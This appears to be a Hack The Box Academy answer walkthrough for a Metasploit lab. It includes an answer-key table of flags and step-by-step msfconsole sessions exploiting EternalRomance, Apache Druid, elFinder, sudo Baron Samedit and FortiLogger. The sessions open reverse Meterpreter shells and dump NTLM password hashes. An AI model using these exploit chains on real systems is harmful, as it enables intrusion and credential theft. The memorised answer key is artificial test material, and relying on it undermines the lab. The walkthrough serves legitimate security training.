![[cheatsheat-Using the Metasploit Framework]]




## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|Introduction to Metasploit|Question 1|Metasploit Pro|
|Introduction to Metasploit|Question 2|msfconsole|
|Modules|Question 1|HTB{MSF-W1nD0w5-3xPL01t4t10n}|
|Payloads|Question 1|HTB{MSF_Expl01t4t10n}|
|Sessions & Jobs|Question 1|elFinder|
|Sessions & Jobs|Question 2|www-data|
|Sessions & Jobs|Question 3|HTB{5e55ion5_4r3_sw33t}|
|Meterpreter|Question 1|nt authority\system|
|Meterpreter|Question 2|cf3a5525ee9414229e66279623ed5c58|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Modules

## Question 1

### "Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer."

After spawning the target machine, students first need to launch `msfconsole`:

Code: shell

```shell
msfconsole -q
```

```shell-session
┌─[us-academy-1]─[10.10.14.50]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfconsole -q

msf6 >
```

Then, students need to search for the `EternalRomance` exploit (which was developed by the NSA's Equation Group and leaked by The Shadow Brokers):

Code: shell

```shell
search eternalromance
```

```shell-session
msf6 > search eternalromance

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution

Interact with a module by name or index. For example info 1, use 1 or use auxiliary/admin/smb/ms17_010_command
```

Students need to use the first exploit that holds the tag number 0, which they can select by using the `use` command:

Code: shell

```shell
use 0
```

```shell-session
msf6 > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) >
```

When using the `show options` command, students will find out that the two options that need to be set for this exploit are `LHOST` and `RHOSTS`:

Code: shell

```shell
set LHOST tun0
set RHOSTS STMIP
```

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0

LHOST => tun0
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.253.135

RHOSTS => 10.129.253.135
```

Students then need to launch the exploit using either `exploit` or `run`:

Code: shell

```shell
exploit
```

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.50:4444 
[*] 10.129.253.135:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.253.135:445 - Built a write-what-where primitive...
[+] 10.129.253.135:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.253.135:445 - Selecting PowerShell target
[*] 10.129.253.135:445 - Executing the payload...
[+] 10.129.253.135:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.253.135
[*] Meterpreter session 1 opened (10.10.14.50:4444 -> 10.129.253.135:49671) at 2022-06-10 17:49:47 +0100

meterpreter >
```

Once students attain a `meterpreter` shell, they at last need to read the contents of the "flag.txt" file on the Desktop directory of the Administrator user:

Code: shell

```shell
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

```shell-session
meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag.txt

HTB{MSF-W1nD0w5-3xPL01t4t10n}
```

Answer: `HTB{MSF-W1nD0w5-3xPL01t4t10n}`

# Payloads

## Question 1

### "Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer."

After spawning the target machine and launching `msfconsole`, students need to search for `Apache Druid` exploits using the `search` command:

Code: shell

```shell
search Apache Druid
```

```shell-session
msf6 > search Apache Druid

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/linux/http/apache_druid_js_rce  2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/apache_druid_js_rce
```

There is only one exploit available, holding the tag number 0, thus, students need to use it by using the `use` command:

Code: shell

```shell
use 0
```

```shell-session
msf6 > use 0

[*]Using configured payload linux/x64/meterpreter/reverse_tcp
```

Students then need to know the options that need to be set for this exploit by using the `show options` (or `options` alone) command, and they will find out that only two options need to be set, `LHOST` and `RHOSTS`:

Code: shell

```shell
set LHOST tun0
set RHOSTS STMIP
```

```shell-session
msf6 exploit(linux/http/apache_druid_js_rce) > set LHOST tun0

LHOST => 10.10.14.17
msf6 exploit(linux/http/apache_druid_js_rce) > set RHOSTS 10.129.203.52

RHOSTS => 10.129.203.52
```

Afterward, students need to launch the exploit by typing either `exploit` or `run`:

Code: shell

```shell
exploit
```

```shell-session
msf6 exploit(linux/http/apache_druid_js_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Using URL: http://0.0.0.0:8080/7ojPoAXuwCndI
[*] Local IP: http://46.101.56.68:8080/7ojPoAXuwCndI
[*] Client 10.129.203.52 (curl/7.68.0) requested /7ojPoAXuwCndI
[*] Sending payload to 10.129.203.52 (curl/7.68.0)
[*] Sending stage (3012548 bytes) to 10.129.203.52
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.129.203.52:60952) at 2022-06-12 14:20:07 +0100
[*] Command Stager progress - 100.00% done (117/117 bytes)
[*] Server stopped.

meterpreter >
```

Students at last need to retrieve the contents of the flag named "flag.txt" under the root directory:

Code: shell

```shell
cat /root/flag.txt
```

```shell-session
meterpreter > cat /root/flag.txt

HTB{MSF_Expl01t4t10n}
```

Answer: `HTB{MSF_Expl01t4t10n}`

# Sessions & Jobs

## Question 1

### "The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?"

After spawning the target machine, students need to navigate to its website's web root and view its page source to find out that it's running `elFinder`:

![Using_the_Metasploit_Framework_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/34/Using_the_Metasploit_Framework_Walkthrough_Image_1.png)

Answer: `elFinder`

# Sessions & Jobs

## Question 2

### "Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?"

Students need to launch `msfconsole` and then search for `elFinder` exploits using the `search` command:

Code: shell

```shell
search elFinder
```

```shell-session
msf6 > search elFinder

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection


Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

Students then need to select the exploit having the number tag 3 using the `use` command:

Code: shell

```shell
use 3
```

```shell-session
msf6 > use 3

[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/http/elfinder_archive_cmd_injection) >
```

After using the `show options` command, students will find out that they need to set two options, `LHOST` and `RHOSTS`:

Code: shell

```shell
set LHOST tun0 
set RHOSTS STMIP
```

```shell-session
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > setg LHOST tun0

LHOST => tun0
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set RHOSTS 10.129.161.215

RHOSTS => 10.129.161.215
```

Students then will need to launch the exploit using the `exploit` command:

Code: shell

```shell
exploit
```

```shell-session
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > exploit

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. elFinder running version 2.1.53
[*] Uploading file kQicyiWU.txt to elFinder
[+] Text file was successfully uploaded!
[*] Attempting to create archive KaAVhqkrKY.zip
[+] Archive was successfully created!
[*] Using URL: http://0.0.0.0:8080/8UJhg4LeuT82yH7
[*] Local IP: http://142.93.43.160:8080/8UJhg4LeuT82yH7
[*] Client 10.129.161.215 (Wget/1.20.3 (linux-gnu)) requested /8UJhg4LeuT82yH7
[*] Sending payload to 10.129.161.215 (Wget/1.20.3 (linux-gnu))
[*] Command Stager progress -  53.45% done (62/116 bytes)
[*] Command Stager progress -  72.41% done (84/116 bytes)
[*] Sending stage (984904 bytes) to 10.129.161.215
[+] Deleted kQicyiWU.txt
[+] Deleted KaAVhqkrKY.zip
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.129.161.215:33188) at 2022-06-12 16:31:31 +0100
[*] Command Stager progress -  83.62% done (97/116 bytes)
[*] Command Stager progress - 100.00% done (116/116 bytes)
[*] Server stopped.

meterpreter >
```

Since the `whoami` command is not supported in `meterpreter`, students need to first spawn a normal shell using the `shell` command and then run `whoami`:

Code: shell

```shell
shell
whoami
```

```shell-session
meterpreter > shell

Process 1787 created.
Channel 1 created.
whoami

www-data
```

Answer: `www-data`

# Sessions & Jobs

## Question 3

### "The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer."

Students first need to know which version of `sudo` is running on the spawned target machine that they have penetrated in the previous question, which can be done using the command `sudo` with the flag `-V`:

Code: shell

```shell
sudo -V
```

```shell-session
www-data@nix02:~/html/files$ sudo -V

sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

Searching online for exploits for `sudo 1.8.31`, students will find out that `sudo` had a critical vulnerability dubbed `Baron Samedit`, holding the CVE ID of `CVE-2021-3156`. Before searching for the exploit, students first need to background the current `meterpreter` session using the `background` command:

Code: shell

```shell
background
```

```shell-session
meterpreter > background

[*] Backgrounding session 1...
msf6 exploit(linux/http/elfinder_archive_cmd_injection) >
```

Then, students need to search for an exploit module for `CVE-2021-3156`, which can be done in multiple ways. Students can search using the CVE ID directly:

Code: shell

```shell
search CVE-2021-3156
```

```shell-session
msf6 exploit(linux/local/sudo_baron_samedit) > search CVE-2021-3156

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/linux/local/sudo_baron_samedit  2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/local/sudo_baron_samedit
```

Students can also search using the name of the vulnerability:

Code: shell

```shell
search sudo baron samedit
```

```shell-session
msf6 exploit(linux/local/sudo_baron_samedit) > search sudo baron samedit

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/linux/local/sudo_baron_samedit  2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/local/sudo_baron_samedit
```

Alternatively, if there were multiple CVE IDs in the year 2021 and the CVE ID of the exact vulnerability is not known, students can utilize the powerful filtering features of `msfconsole` when searching for exploits. For example, students can search for exploits for `sudo` that have a CVE's disclosure date of 2021:

Code: shell

```shell
search sudo cve:2021
```

```shell-session
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > search sudo cve:2021

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/linux/local/pihole_remove_commands_lpe  2021-04-20       great      Yes    Pi-Hole Remove Commands Linux Priv Esc
   1  exploit/linux/local/polkit_dbus_auth_bypass     2021-06-03       excellent  Yes    Polkit D-Bus Authentication Bypass
   2  exploit/linux/local/sudo_baron_samedit          2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow


Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/local/sudo_baron_samedit
```

Students need to use the exploit with tag number 2 (in case they used the last search query):

Code: shell

```shell
use 2
```

```shell-session
msf6 exploit(linux/http/elfinder_archive_cmd_injection) > use 2

[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
```

Then, students need to see the options of the exploit module using the `show options` command (or `options` alone for short):

Code: shell

```shell
show options
```

```shell-session
msf6 exploit(linux/local/sudo_baron_samedit) > show options

Module options (exploit/linux/local/sudo_baron_samedit):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   SESSION                       yes       The session to run this module on.
   WritableDir  /tmp             yes       A directory where you can write files.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  142.93.43.160    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(linux/local/sudo_baron_samedit) >
```

Three options need to be set by the students, `LHOST`, `LPORT` (since 4444 is already being used by the `elFinder` exploit, thus it must be changed to another port), and `SESSION` (which is 1 in this case):

Code: shell

```shell
set LHOST tun0
set LPORT 9001
set SESSION 1
```

```shell-session
msf6 exploit(linux/local/sudo_baron_samedit) > set LHOST tun0

LHOST => tun0
msf6 exploit(linux/local/sudo_baron_samedit) > set LPORT 9001

LPORT => 9001
msf6 exploit(linux/local/sudo_baron_samedit) > set SESSION 1

SESSION => 1
```

After setting the options, students then need to launch the privilege escalation exploit module on the target using the `exploit` command:

Code: shell

```shell
exploit
```

```shell-session
msf6 exploit(linux/local/sudo_baron_samedit) > exploit

[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: x86
[*] Started reverse TCP handler on 10.10.14.43:9001 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] Writing '/tmp/mjtsEUpe.py' (763 bytes) ...
[*] Writing '/tmp/libnss_/13Ra1W .so.2' (548 bytes) ...
[*] Sending stage (3012548 bytes) to 10.129.203.52
[+] Deleted /tmp/mjtsEUpe.py
[+] Deleted /tmp/libnss_/13Ra1W .so.2
[+] Deleted /tmp/libnss_
[*] Meterpreter session 2 opened (10.10.14.43:9001 -> 10.129.203.52:48532) at 2022-06-14 02:27:59 +0100

meterpreter >
```

Once students attain a `meterpreter` session, they can either spawn a root shell or read the contents of the flag under the "root" directory directly:

Code: shell

```shell
shell
cat /root/flag.txt
```

```shell-session
meterpreter > shell

Process 3808 created.
Channel 1 created.
cat /root/flag.txt

HTB{5e55ion5_4r3_sw33t}
```

Answer: `HTB{5e55ion5_4r3_sw33t}`

# Meterpreter

## Question 1

### "Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?"

After spawning the target machine, students first must know what ports and services are running on it using `Nmap` from (optionally) within `msfconsole`:

Code: shell

```shell
sudo msfdb run
```

```shell-session
┌─[us-academy-1]─[10.10.14.49]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo msfdb run

[i] Database already started

Metasploit tip: You can pivot connections over sessions started with the ssh_login modules

msf6 >
```

(In case students forgot how to set up and initialize the database, they need to refer back to the "Databases" section in the module.)

Students then need to run an `Nmap` scan on the spawned target machine:

Code: shell

```shell
db_nmap -A --top-ports 60 -T5 STMIP
```

```shell-session
msf6 > db_nmap -A --top-ports 60 -T5 10.129.173.75

[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 03:42 BST
[*] Nmap: Nmap scan report for 10.129.173.75
[*] Nmap: Host is up (0.076s latency).
[*] Nmap: Not shown: 55 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: | rdp-ntlm-info:
[*] Nmap: |   Target_Name: WIN-51BJ97BCIPV
[*] Nmap: |   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
[*] Nmap: |   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
[*] Nmap: |   DNS_Domain_Name: WIN-51BJ97BCIPV
[*] Nmap: |   DNS_Computer_Name: WIN-51BJ97BCIPV
[*] Nmap: |   Product_Version: 10.0.17763
[*] Nmap: |_  System_Time: 2022-06-16T02:42:20+00:00
[*] Nmap: | ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
[*] Nmap: | Not valid before: 2022-05-16T08:12:06
[*] Nmap: |_Not valid after:  2022-11-15T08:12:06
[*] Nmap: |_ssl-date: 2022-06-16T02:42:28+00:00; 0s from scanner time.
[*] Nmap: 5000/tcp open  http          Microsoft IIS httpd 10.0
[*] Nmap: |_http-title: FortiLogger | Log and Report System
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE
[*] Nmap: |_http-server-header: Microsoft-IIS/10.0
[*] Nmap: Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
[*] Nmap: No exact OS matches for host (test conditions non-ideal).
[*] Nmap: Network Distance: 2 hops
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   3.1.1:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2022-06-16T02:42:23
[*] Nmap: |_  start_date: N/A
[*] Nmap: TRACEROUTE (using port 8888/tcp)
[*] Nmap: HOP RTT      ADDRESS
[*] Nmap: 1   76.81 ms 10.10.14.1
[*] Nmap: 2   76.14 ms 10.129.173.75
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 24.98 seconds
```

Students will notice that on port 5000, `IIS` version 10.0 is running `FortiLogger`, a log and reporting software:

![Using_the_Metasploit_Framework_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/34/Using_the_Metasploit_Framework_Walkthrough_Image_2.png)

Within `msfconsole`, students need to search for exploits for `FortiLogger` using the `search` command:

Code: shell

```shell
search FortiLogger
```

```shell-session
msf6 > search FortiLogger

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank    Check  Description
   -  ----                                                   ---------------  ----    -----  -----------
   0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/fortilogger_arbitrary_fileupload
```

Students then will need to use/select the only available exploit for `FortiLogger`:

Code: shell

```shell
use 0
```

```shell-session
msf6 > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

After using the `show options` command, students will know that they need to set two options, `LHOST` and `RHOSTS` :

Code: shell

```shell
set LHOST tun0
set RHOSTS STMIP
```

```shell-session
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set RHOSTS 10.129.173.75

RHOSTS => 10.129.173.75
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set LHOST tun0

LHOST => tun0
```

Students at last will need to launch the exploit using the `exploit` command:

Code: shell

```shell
exploit
```

```shell-session
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > exploit

[*] Started reverse TCP handler on 10.10.14.49:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Generate Payload
[+] Payload has been uploaded
[*] Executing payload...
[*] Sending stage (175174 bytes) to 10.129.173.75
[*] Meterpreter session 1 opened (10.10.14.49:4444 -> 10.129.173.75:49697) at 2022-06-16 04:06:26 +0100

meterpreter >
```

Once students attain a `meterpreter` session, they need to spawn a normal shell and then run the `whoami` command:

Code: shell

```shell
shell
whoami
```

```shell-session
meterpreter > shell

Process 10284 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
nt authority\system
```

Answer: `nt authority\system`

# Meterpreter

## Question 2

### "Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer."

Students first need to background the previously established `meterpreter` session:

Code: shell

```shell
background
```

```shell-session
meterpreter > background

[*] Backgrounding session 1...
```

Then, students need to search for the `hashdump` post-exploitation module:

Code: shell

```shell
search hashdump
```

```shell-session
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > search hashdump

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   0   post/aix/hashdump                                                      normal  No     AIX Gather Dump Password Hashes
   1   post/android/gather/hashdump                                           normal  No     Android Gather Dump Password Hashes for Android Systems
   2   post/bsd/gather/hashdump                                               normal  No     BSD Dump Password Hashes
   3   auxiliary/scanner/smb/impacket/secretsdump                             normal  No     DCOM Exec
   4   auxiliary/gather/ldap_hashdump                        2020-07-23       normal  No     LDAP Information Disclosure
   5   post/linux/gather/hashdump                                             normal  No     Linux Gather Dump Password Hashes for Linux Systems
   6   auxiliary/scanner/mssql/mssql_hashdump                                 normal  No     MSSQL Password Hashdump
   7   auxiliary/scanner/mysql/mysql_hashdump                                 normal  No     MYSQL Password Hashdump
   8   post/windows/gather/credentials/mcafee_vse_hashdump                    normal  No     McAfee Virus Scan Enterprise Password Hashes Dump
   9   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal  No     MySQL Authentication Bypass Password Dump
   10  post/osx/gather/hashdump                                               normal  No     OS X Gather Mac OS X Password Hash Collector
   11  auxiliary/scanner/oracle/oracle_hashdump                               normal  No     Oracle Password Hashdump
   12  auxiliary/analyze/crack_databases                                      normal  No     Password Cracker: Databases
   13  auxiliary/scanner/postgres/postgres_hashdump                           normal  No     Postgres Password Hashdump
   14  post/solaris/gather/hashdump                                           normal  No     Solaris Gather Dump Password Hashes for Solaris Systems
   15  post/windows/gather/credentials/domain_hashdump                        normal  No     Windows Domain Controller Hashdump
   16  post/windows/gather/credentials/mssql_local_hashdump                   normal  No     Windows Gather Local SQL Server Hash Dump
   17  post/windows/gather/hashdump                                           normal  No     Windows Gather Local User Account Password Hashes (Registry)
   18  post/windows/gather/smart_hashdump                                     normal  No     Windows Gather Local and Domain Controller Account Password Hashes


Interact with a module by name or index. For example info 18, use 18 or use post/windows/gather/smart_hashdump
```

Although the required module has the tag number 17, students can narrow down the number of returned modules by being more specific in their search query:

Code: shell

```shell
search hashdump post windows
```

```shell-session
msf6 post(windows/gather/hashdump) > search hashdump post windows

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank    Check  Description
   -  ----                                                  ---------------  ----    -----  -----------
   0  post/windows/gather/credentials/mcafee_vse_hashdump                    normal  No     McAfee Virus Scan Enterprise Password Hashes Dump
   1  post/windows/gather/credentials/domain_hashdump                        normal  No     Windows Domain Controller Hashdump
   2  post/windows/gather/credentials/mssql_local_hashdump                   normal  No     Windows Gather Local SQL Server Hash Dump
   3  post/windows/gather/hashdump                                           normal  No     Windows Gather Local User Account Password Hashes (Registry)
   4  post/windows/gather/smart_hashdump                                     normal  No     Windows Gather Local and Domain Controller Account Password Hashes


Interact with a module by name or index. For example info 4, use 4 or use post/windows/gather/smart_hashdump
```

Now only modules for the Windows operating system are shown, and the one required holds the tag number 3, thus students need to use/select it:

Code: shell

```shell
use 3
```

```shell-session
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > use 3
```

After using the `show options` command, students will know that the only option that needs to be set is `SESSION`:

```shell
set SESSION 1
```

```shell-session
msf6 post(windows/gather/hashdump) > set SESSION 1

SESSION => 1
```

Students at last will need to run/launch the post-exploitation module using the `run` command:

```shell
run
```

```shell-session
msf6 post(windows/gather/hashdump) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY c897d22c1c56490b453e326f86b2eef8...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::


[*] Post module execution completed
```

The NTLM password hash of the user `htb-user` is `cf3a5525ee9414229e66279623ed5c58`.

Answer: `cf3a5525ee9414229e66279623ed5c58`